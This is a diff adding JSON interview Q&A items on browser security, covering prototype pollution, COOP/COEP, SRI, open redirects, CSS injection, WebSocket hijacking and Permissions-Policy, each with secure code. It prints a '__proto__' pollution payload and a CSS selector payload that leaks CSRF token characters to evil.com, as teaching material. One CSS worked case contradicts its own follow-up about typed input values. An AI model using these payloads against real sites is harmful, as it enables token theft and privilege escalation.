+    "difficulty": "interview"
+  },
+  {
+    "Q": "What is Prototype Pollution in JavaScript, and how do you prevent object prototype manipulation in deep merge utilities?",
+    "A": "**Direct answer:** **Prototype Pollution** is a vulnerability unique to JavaScript where an attacker manipulates the fundamental `Object.prototype` object, injecting or modifying properties that are automatically inherited by *every single object* created in the entire application runtime. It typically occurs when flawed recursive deep-merge, object-assign, or query-string parsing functions traverse properties without filtering magic properties like `__proto__`, `constructor`, or `prototype`.\n\n```typescript\n// VULNERABLE DEEP MERGE IMPLEMENTATION:\nfunction vulnerableMerge(target: any, source: any) {\n    for (const key in source) {\n        if (typeof source[key] === 'object' && source[key] !== null) {\n            if (!target[key]) target[key] = {};\n            vulnerableMerge(target[key], source[key]);\n        } else {\n            target[key] = source[key];\n        }\n    }\n    return target;\n}\n\n// EXPLOIT PAYLOAD: Malicious JSON input\nconst maliciousJSON = '{\"__proto__\": {\"isAdmin\": true}}';\nvulnerableMerge({}, JSON.parse(maliciousJSON));\n\n// RESULT: Prototype polluted across the entire runtime!\nconst normalUser: any = {};\nconsole.log(normalUser.isAdmin); // Prints true! Every object now inherits isAdmin!\n\n// SECURE IMPLEMENTATION:\nfunction safeMerge(target: any, source: any) {\n    for (const key of Object.keys(source)) {\n        // BLOCK MAGIC PROTOTYPE KEYS:\n        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {\n            continue;\n        }\n        if (typeof source[key] === 'object' && source[key] !== null) {\n            if (!target[key]) target[key] = {};\n            safeMerge(target[key], source[key]);\n        } else {\n            target[key] = source[key];\n        }\n    }\n    return target;\n}\n```\n\n**Complexity analysis and mechanics:**\n- **Runtime blast radius:** Mutating `Object.prototype` corrupts property lookups across third-party libraries, Express middleware, and React components.\n- **Defenses:** 1. Block `__proto__`, `constructor`, `prototype`. 2. Use `Object.create(null)` for prototype-less dictionary lookups. 3. Use `Map` instead of raw plain objects.\n\n**Algorithmic mechanics and edge cases:**\n`Object.freeze(Object.prototype)` can be called on application startup to freeze the root prototype object, making prototype pollution impossible across the entire JavaScript runtime.",
+    "Why": "Sanitizing recursive merge keys prevents attackers from modifying Object.prototype to bypass authentication logic.",
+    "Risk": "Polluting Object.prototype alters default property lookups across all objects in memory, enabling privilege escalation.",
+    "Trade": "Object.freeze(Object.prototype) eliminates prototype pollution but can break poorly written third-party libraries that polyfill methods.",
+    "Try": "Run the vulnerableMerge snippet in the browser console and observe how {} suddenly inherits isAdmin=true.",
+    "worked_case": "Walkthrough scenario: An application parses URL query parameters using a naive deep-assignment loop: params[key] = val. An attacker sends a link with ?__proto__[isAdmin]=true. The query parser assigns to target.__proto__.isAdmin, setting the property on Object.prototype. Later, an authorization check: if (user.isAdmin) evaluates to true for an unauthenticated guest user, granting full admin panel access. Filtering __proto__ blocks the injection.",
+    "citations": [
+      "https://owasp.org/www-community/attacks/Prototype_Pollution",
+      "https://portswigger.net/web-security/prototype-pollution"
+    ],
+    "follow_ups": [
+      {
+        "Q": "How do prototype-less objects created via Object.create(null) prevent prototype pollution?",
+        "A": "Objects created with Object.create(null) have no prototype chain (no __proto__ or Object methods), making prototype injection impossible."
+      }
+    ],
+    "reviewer_status": {
+      "status": "reviewed",
+      "reviewer": "Technical curriculum review",
+      "reviewed_at": "2026-10-24"
+    },
+    "answer_format": "conceptual",
+    "difficulty": "interview"
+  },
+  {
+    "Q": "How does Cross-Origin Opener Policy (COOP) and Cross-Origin Embedder Policy (COEP) isolate browser process memory?",
+    "A": "**Direct answer:** In modern operating systems and web browsers, multiple browsing contexts (tabs and windows) opened by links can share the same operating system process thread. The Spectre and Meltdown hardware CPU vulnerabilities proved that malicious code running in one origin can use CPU speculative execution and microarchitectural cache timing attacks to read secret memory (passwords, credit cards, keys) belonging to other origins hosted in that same process.\n\nTo enforce **Process Isolation at the OS level**, web standards introduced two strict response headers that work in tandem:\n1. **`Cross-Origin-Opener-Policy: same-origin` (COOP):** Forces the browser to put the page into a completely separate browsing context group and OS process, severing all `window.opener` pointers to cross-origin windows.\n2. **`Cross-Origin-Embedder-Policy: require-corp` (COEP):** Prohibits the page from loading *any* cross-origin subresource (image, script, stylesheet, iframe) unless the resource explicitly responds with a `Cross-Origin-Resource-Policy: cross-origin` header.\n\n```http\nHTTP/1.1 200 OK\nCross-Origin-Opener-Policy: same-origin\nCross-Origin-Embedder-Policy: require-corp\n```\n\n**Complexity analysis and mechanics:**\n- **`window.crossOriginIsolated`:** When both headers are active, the browser sets `window.crossOriginIsolated = true`.\n- **Unlocked capabilities:** Only when cross-origin isolated will modern browsers permit the creation of `SharedArrayBuffer` and high-resolution `performance.now()` timers without artificial jitter.\n\n**Algorithmic mechanics and edge cases:**\nDeploying COEP can break third-party ad networks, social widgets, and CDN images that do not serve CORP headers. Use `Cross-Origin-Embedder-Policy-Report-Only` initially to monitor which subresources would be blocked before enforcing production rules.",
+    "Why": "COOP and COEP enforce OS-level process isolation, neutralizing Spectre-style cache-timing memory extraction attacks.",
+    "Risk": "Enabling COEP without auditing external dependencies immediately blocks third-party images, fonts, and scripts that lack CORP headers.",
+    "Trade": "Unlocks multi-threaded WebAssembly and SharedArrayBuffer at the cost of strict subresource policy enforcement.",
+    "Try": "Inspect window.crossOriginIsolated in DevTools and verify that SharedArrayBuffer constructor throws without COOP/COEP headers.",
+    "worked_case": "Walkthrough scenario: A web-based audio workstation needs SharedArrayBuffer for real-time multi-threaded audio synthesis. Without COOP and COEP, creating new SharedArrayBuffer(1024) throws a ReferenceError. The backend adds Cross-Origin-Opener-Policy: same-origin and Cross-Origin-Embedder-Policy: require-corp. The browser isolates the process, window.crossOriginIsolated evaluates to true, and multi-threaded audio processing runs with zero microarchitectural memory leakage.",
+    "citations": [
+      "https://web.dev/articles/coop-coep",
+      "https://developer.mozilla.org/en-US/docs/Web/API/Window/crossOriginIsolated"
+    ],
+    "follow_ups": [
+      {
+        "Q": "Why did browsers originally disable SharedArrayBuffer after the Spectre vulnerability was published?",
+        "A": "SharedArrayBuffer enabled creating microsecond-precision timers across worker threads that could measure CPU cache timing differences to leak memory."
+      }
+    ],
+    "reviewer_status": {
+      "status": "reviewed",
+      "reviewer": "Technical curriculum review",
+      "reviewed_at": "2026-10-24"
+    },
+    "answer_format": "conceptual",
+    "difficulty": "interview"
+  },
+  {
+    "Q": "How do you secure third-party script integrations (analytics, tag managers) using Subresource Integrity (SRI) and CSP?",
+    "A": "**Direct answer:** Modern web applications frequently include third-party scripts from external CDNs (e.g. Google Tag Manager, analytics, payment SDKs, polyfills). If an external CDN is compromised or an attacker performs a DNS hijacking attack, the CDN can serve modified, malicious JavaScript directly to your users—a catastrophic supply-chain attack (e.g. Magecart attacks stealing credit cards). Frontends defend against this using **Subresource Integrity (SRI)** paired with strict Content Security Policies:\n\n1. **Subresource Integrity (SRI):** Appends an `integrity` attribute containing the base64-encoded cryptographic hash (SHA-256, SHA-384, or SHA-512) of the expected script file. Before executing the script, the browser hashes the downloaded bytes; if a single character was altered, the browser terminates the script immediately.\n2. **`crossorigin=\"anonymous\"`:** Mandatory on SRI tags so the browser can read the byte hash without CORS privacy restrictions.\n\n```html\n<!-- Secure Third-Party Script with Subresource Integrity (SRI) -->\n<script\n    src=\"https://cdn.example.com/analytics.v2.js\"\n    integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\"\n    crossorigin=\"anonymous\"\n></script>\n```\n\n**Complexity analysis and mechanics:**\n- **Hash verification:** Executed in the browser's C++ network parser before JavaScript compilation begins.\n- **Magecart defense:** Even if an attacker compromises the CDN file server and injects a credit card skimmer, the hash fails and the browser drops the file.\n\n**Algorithmic mechanics and edge cases:**\nSRI cannot be used for dynamic scripts that frequently change content on the fly without versioned URLs (e.g. Google Tag Manager containers that update via web UI). For unversioned dynamic scripts, isolate them inside a sandboxed iframe or configure strict CSP `connect-src` to prevent unauthorized exfiltration endpoints.",
+    "Why": "SRI prevents third-party CDN supply chain compromises from turning into client-side credential skimming attacks.",
+    "Risk": "Omitting crossorigin='anonymous' causes the browser to ignore the integrity attribute on cross-origin scripts.",
+    "Trade": "Updating an external library version requires recalculating and deploying the new integrity hash in your HTML.",
+    "Try": "Alter one character in an integrity hash on a CDN script tag and observe the browser console error: Integrity check failed.",
+    "worked_case": "Walkthrough scenario: A British Airways payment page had its third-party script hijacked by Magecart attackers, stealing 380,000 credit cards. If Subresource Integrity had been deployed with integrity=\"sha384-...\", the moment the attackers modified the CDN script to add the credit card skimmer, the file's SHA-384 hash would fail to match the HTML tag, and the browser would refuse to execute the compromised code.",
+    "citations": [
+      "https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity",
+      "https://owasp.org/www-community/attacks/Magecart"
+    ],
+    "follow_ups": [
+      {
+        "Q": "What happens if a script with an integrity attribute is served over plain HTTP or fails CORS checks?",
+        "A": "The browser refuses to calculate the hash for cross-origin resources without CORS approval, blocking the script completely."
+      }
+    ],
+    "reviewer_status": {
+      "status": "reviewed",
+      "reviewer": "Technical curriculum review",
+      "reviewed_at": "2026-10-24"
+    },
+    "answer_format": "conceptual",
+    "difficulty": "interview"
+  },
+  {
+    "Q": "How does Open Redirect vulnerability occur on login callback screens, and how do you validate redirection targets?",
+    "A": "**Direct answer:** An **Open Redirect** vulnerability occurs when an application accepts an unvalidated user-supplied URL parameter (e.g. `?redirect_to=https://evil.com`) and navigates the browser to that destination (via `window.location.href = redirectTo` or HTTP 302). Attackers exploit this in phishing campaigns: they send victims a link that looks legitimate (`https://trusted-bank.com/login?redirect_to=https://fake-bank.com`). The victim trusts the `trusted-bank.com` domain, logs in, and is immediately redirected to the attacker's fake portal.\n\nSecure validation requires restricting redirects strictly to **relative paths on the same origin** or an explicit domain whitelist:\n\n```typescript\n// Secure Redirection Validator:\nexport function getSafeRedirectUrl(targetUrl: string | null, fallback: string = '/dashboard'): string {\n    if (!targetUrl) return fallback;\n\n    // RULE 1: Disallow protocol-relative URLs (e.g. '//evil.com' navigates to evil.com!)\n    if (targetUrl.startsWith('//')) return fallback;\n\n    // RULE 2: Safe relative path starting with single slash\n    if (targetUrl.startsWith('/') && !targetUrl.startsWith('/\\\\')) {\n        return targetUrl;\n    }\n\n    // RULE 3: Strict Origin Whitelisting for Absolute URLs\n    try {\n        const parsed = new URL(targetUrl, window.location.origin);\n        if (parsed.origin === window.location.origin) {\n            return parsed.pathname + parsed.search + parsed.hash;\n        }\n    } catch {\n        return fallback;\n    }\n\n    return fallback;\n}\n```\n\n**Complexity analysis and mechanics:**\n- **Protocol-relative bypass:** Attackers frequently bypass naive `url.startsWith('/')` checks using `//evil.com`, which the browser parses as a scheme-relative link navigating to `https://evil.com`.\n- **Backslash bypass:** In older engines, `/\\evil.com` was normalized to `//evil.com`.\n\n**Algorithmic mechanics and edge cases:**\nNever perform regex checks like `targetUrl.includes('mycompany.com')`; an attacker easily bypasses this with `https://evilmycompany.com` or `https://attacker.com?ref=mycompany.com`. Always parse with `new URL()` and verify `parsed.origin`.",
+    "Why": "Strict relative path validation stops attackers from leveraging trusted brand domains as springboards for phishing campaigns.",
+    "Risk": "Naive startsWith('/') checks fail to block protocol-relative URLs (//evil.com), permitting external redirects.",
+    "Trade": "Disallows arbitrary external redirects unless explicit cross-domain partner origins are allowlisted.",
+    "Try": "Test getSafeRedirectUrl('//attacker.com') vs getSafeRedirectUrl('/profile') and verify it defaults to fallback on protocol-relative URLs.",
+    "worked_case": "Walkthrough scenario: A company's login page reads const redirect = new URLSearchParams(location.search).get('return'); and calls window.location.href = redirect. An attacker sends a phishing email with a link to company.com/login?return=https://stealer.com. The user enters their password on company.com and gets redirected to stealer.com. Using getSafeRedirectUrl() detects that stealer.com is not on company.com's origin and redirects safely to /dashboard.",
+    "citations": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
+      "https://cwe.mitre.org/data/definitions/601.html"
+    ],
+    "follow_ups": [
+      {
+        "Q": "Why is redirecting to a protocol-relative URL like '//evil.com' dangerous?",
+        "A": "Browsers interpret '//evil.com' as inheriting the current page's protocol (https://), navigating directly to the external evil.com website."
+      }
+    ],
+    "reviewer_status": {
+      "status": "reviewed",
+      "reviewer": "Technical curriculum review",
+      "reviewed_at": "2026-10-24"
+    },
+    "answer_format": "conceptual",
+    "difficulty": "interview"
+  },
+  {
+    "Q": "How do modern browsers protect against CSS injection and font-probing side-channel attacks?",
+    "A": "**Direct answer:** **CSS Injection** is an attack where an attacker injects malicious CSS rules (via an unsanitized `<style>` tag, `style` attribute, or user-controlled CSS theme). Attackers exploit CSS attribute selectors and external `url()` background calls to extract sensitive data (like CSRF tokens or user inputs) character-by-character via **CSS-based Exfiltration**:\n\n```css\n/* ATTACKER CSS PAYLOAD: Exfiltrating input value character by character */\ninput[name=\"csrf\"][value^=\"a\"] { background: url('https://evil.com/leak?char=a'); }\ninput[name=\"csrf\"][value^=\"b\"] { background: url('https://evil.com/leak?char=b'); }\n/* Once 'a' is confirmed: */\ninput[name=\"csrf\"][value^=\"ab\"] { background: url('https://evil.com/leak?char=ab'); }\n```\n\n**Modern Defenses & Browser Mitigations:**\n1. **Content Security Policy (`style-src`):** Prohibit inline styles by omitting `'unsafe-inline'` and enforcing nonces (`style-src 'nonce-{RANDOM}'`) or disabling external style loading (`style-src 'self'`).\n2. **Restrict `connect-src` and `img-src`:** A strict CSP `img-src 'self'` prevents injected CSS `url(...)` declarations from making unauthorized HTTP background requests to attacker servers.\n3. **Browser Sanitization of Custom Fonts:** Browsers restrict CSS font-probing side-channels by partitioning font caches and disabling `url()` triggers on untrusted CSS inputs.\n\n**Complexity analysis and mechanics:**\n- **Blind CSS exfiltration:** An attacker needs only ~36 HTTP requests per character (alphanumeric) to exfiltrate an entire 32-character secret token.\n- **Safe user themes:** If users are allowed to customize UI colors, accept only validated hex strings (`/^#[0-9a-f]{6}$/i`) applied to CSS variables, never raw user CSS strings.\n\n**Algorithmic mechanics and edge cases:**\nNever allow user-supplied HTML to include `<style>` tags or unvalidated `style=\"...\"` attributes; DOMPurify should always be configured to strip style tags (`FORBID_TAGS: ['style']`).",
+    "Why": "Restricting style-src and img-src in CSP neutralizes CSS attribute-selector side-channel token extraction.",
+    "Risk": "Allowing user-submitted style tags allows attackers to exfiltrate CSRF tokens and user passwords without executing JavaScript.",
+    "Trade": "Strict style-src nonces require build tooling to attach nonces to injected CSS-in-JS style tags.",
+    "Try": "Inspect how DOMPurify sanitizes style attributes by default to strip expression() and external url() declarations.",
+    "worked_case": "Walkthrough scenario: An application allows users to set a custom profile background via markdown: [test](http://foo.com \"style=...\"). An attacker crafts an injected style block with 50 attribute selectors targeting input[type='password'][value^='a']. As the user types their password, each keystroke triggers a background image fetch to evil.com, logging the user's password. Enforcing CSP style-src 'self' and DOMPurify style stripping halts the CSS exfiltration attack completely.",
+    "citations": [
+      "https://portswigger.net/research/css-injection-primitives",
+      "https://owasp.org/www-community/attacks/CSS_Injection"
+    ],
+    "follow_ups": [
+      {
+        "Q": "Can CSS exfiltration steal data from input fields if the user has not typed into them yet?",
+        "A": "It can steal default values populated in the value attribute by the server, but modern browsers prevent CSS attribute selectors from matching dynamic typed values."
+      }
+    ],
+    "reviewer_status": {
+      "status": "reviewed",
+      "reviewer": "Technical curriculum review",
+      "reviewed_at": "2026-10-24"
+    },
+    "answer_format": "conceptual",
+    "difficulty": "interview"
+  },
+  {
+    "Q": "How do you protect client-side WebSocket connections against Cross-Site WebSocket Hijacking (CSWSH)?",
+    "A": "**Direct answer:** **Cross-Site WebSocket Hijacking (CSWSH)** is the WebSocket equivalent of CSRF. When a browser initiates a WebSocket connection (`new WebSocket('wss://api.example.com')`), the browser automatically includes stored session cookies in the HTTP `GET` Upgrade handshake. If an attacker's website (`evil.com`) opens a WebSocket connection to `wss://api.example.com`, the browser transmits the victim's authentication cookies. Because WebSockets are not restricted by the Same-Origin Policy, the attacker's page establishes a full-duplex authenticated socket connection to the user's account.\n\nTo defend against CSWSH, frontends and backends implement three defenses:\n1. **Server-Side `Origin` Header Validation:** The server must inspect the `Origin` header during the HTTP Upgrade handshake and reject any handshake not originating from an authorized domain.\n2. **Short-Lived Ephemeral Ticket Handshake (Frontend Best Practice):** Rather than relying on ambient cookies, the frontend makes an authenticated HTTP `POST /api/ws-token` to obtain a single-use, 30-second ticket, and passes it as a query parameter (`wss://api.com?ticket=xyz123`). The ticket is consumed and invalidated upon connection.\n3. **`SameSite=Strict` on Session Cookies:** Prevents the browser from sending session cookies on cross-origin WebSocket upgrades.\n\n```typescript\n// Secure Client-Side WebSocket Handshake using Ephemeral Tickets:\nexport async function connectSecureWebSocket() {\n    // 1. Fetch single-use connection ticket over authenticated HTTP:\n    const res = await fetch('/api/auth/ws-ticket', { method: 'POST' });\n    if (!res.ok) throw new Error('Could not obtain WebSocket ticket');\n    const { ticket } = await res.json();\n\n    // 2. Connect using single-use ticket in query string:\n    const ws = new WebSocket(`wss://api.enterprise.com/stream?ticket=${encodeURIComponent(ticket)}`);\n    ws.onopen = () => console.log('Secure authenticated WebSocket connected');\n    return ws;\n}\n```\n\n**Complexity analysis and mechanics:**\n- **Same-Origin Policy exception:** The SOP restricts `fetch` and `XMLHttpRequest`, but explicitly does *not* block opening cross-origin WebSockets.\n- **Single-use ticket lifecycle:** The ticket expires in 30 seconds and can only be consumed once, preventing replay attacks.\n\n**Algorithmic mechanics and edge cases:**\nThe browser's native `WebSocket` API does not allow setting custom HTTP headers during the handshake. Using ticket-based authentication or authenticating immediately via an initial JSON message frame (`{ type: 'AUTH', token }`) over the established socket avoids relying on ambient cookies.",
+    "Why": "Ephemeral connection tickets and Origin validation prevent third-party malicious sites from hijacking authenticated WebSockets.",
+    "Risk": "Relying purely on ambient session cookies for WebSocket authentication permits any malicious website to open a live hijacked socket.",
+    "Trade": "Requires an initial HTTP roundtrip to mint an ephemeral ticket before opening the WebSocket connection.",
+    "Try": "Attempt to open a WebSocket connection from a third-party origin in the browser console and verify if the server rejects the handshake.",
+    "worked_case": "Walkthrough scenario: An attacker hosts a phishing site that executes const ws = new WebSocket('wss://bank.com/live-transactions'). The user's browser sends bank.com's session cookie. Without Origin checks, the socket connects, and the attacker receives real-time banking notifications. With Origin header validation and single-use tickets, bank.com detects Origin: evil.com, rejects the upgrade with HTTP 403 Forbidden, and protects the user's data stream.",
+    "citations": [
+      "https://owasp.org/www-community/attacks/Cross-Site_WebSocket_Hijacking",
+      "https://datatracker.ietf.org/doc/html/rfc6455#section-10.2"
+    ],
+    "follow_ups": [
+      {
+        "Q": "Can client-side JavaScript forge the Origin header during a WebSocket connection?",
+        "A": "No, the Origin header is a forbidden header name managed exclusively by the browser engine; JavaScript cannot overwrite it."
+      }
+    ],
+    "reviewer_status": {
+      "status": "reviewed",
+      "reviewer": "Technical curriculum review",
+      "reviewed_at": "2026-10-24"
+    },
+    "answer_format": "conceptual",
+    "difficulty": "interview"
+  },
+  {
+    "Q": "How do Permission-Policy headers restrict browser feature access (camera, microphone, geolocation, payment)?",
+    "A": "**Direct answer:** **`Permissions-Policy`** (formerly known as `Feature-Policy`) is an HTTP response header that allows site owners to selectively enable, disable, or restrict the use of sensitive browser hardware and powerful web platform features across the page and all embedded `<iframe>` elements. It enforces the principle of least privilege at the browser platform level: if your web application does not require a microphone, camera, or USB device access, disabling them in `Permissions-Policy` guarantees that even if a third-party analytics script or advertising iframe is compromised, the attacker cannot spy on the user or access sensitive device sensors.\n\n```http\nHTTP/1.1 200 OK\nPermissions-Policy: \n    camera=(), \n    microphone=(), \n    geolocation=(self), \n    payment=(self \"https://checkout.partner.com\"), \n    usb=(), \n    display-capture=()\n```\n\n**Directive Syntax Breakdown:**\n- `feature=()` -> Completely disabled for the entire page and all embedded iframes (empty allowlist).\n- `feature=(self)` -> Enabled only for the document's own origin; disabled for all third-party iframes.\n- `feature=(self \"https://domain.com\")` -> Enabled for self and explicitly specified external origins.\n- `feature=*` -> Enabled for all origins (strongly discouraged for sensitive features).\n\n**Complexity analysis and mechanics:**\n- **Hardware-level denial:** When a feature is disabled via `Permissions-Policy`, calling the corresponding API (e.g., `navigator.geolocation.getCurrentPosition`) immediately triggers a `NotAllowedError` DOMException without prompting the user.\n- **Iframe inheritance:** Embedded iframes can never exceed the permissions granted by the parent document's `Permissions-Policy`.\n\n**Algorithmic mechanics and edge cases:**\nPermissions-Policy also restricts non-hardware features, such as `document-domain=()`, which prevents legacy scripts from using `document.domain` to bypass the Same-Origin Policy, closing historic SOP relaxation loopholes.",
+    "Why": "Permissions-Policy restricts access to sensitive hardware sensors, preventing rogue third-party scripts from recording users.",
+    "Risk": "Leaving camera, microphone, and geolocation unconstrained allows compromised third-party scripts to trigger permission prompts.",
+    "Trade": "Features disabled in the header cannot be used anywhere on the page without updating the server configuration.",
+    "Try": "Set Permissions-Policy: camera=() on a page and observe navigator.mediaDevices.getUserMedia() immediately reject with NotAllowedError.",
+    "worked_case": "Walkthrough scenario: A banking dashboard embeds a third-party marketing survey iframe. The survey script gets compromised by a malicious actor attempting to access user cameras via navigator.mediaDevices.getUserMedia(). Because the banking application served Permissions-Policy: camera=(), microphone=(), the browser immediately rejects the media request with NotAllowedError without even displaying a camera prompt to the user, protecting customer privacy.",
+    "citations": [
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy",
+      "https://w3c.github.io/webappsec-permissions-policy/"
+    ],
+    "follow_ups": [
+      {
+        "Q": "What was the previous name of the Permissions-Policy header?",
+        "A": "It was previously named Feature-Policy before being standardized with new structured field value syntax as Permissions-Policy."
+      }
+    ],
+    "reviewer_status": {
+      "status": "reviewed",
+      "reviewer": "Technical curriculum review",
+      "reviewed_at": "2026-10-24"
+    },
+    "answer_format": "conceptual",
+    "difficulty": "interview"
+  }
+]
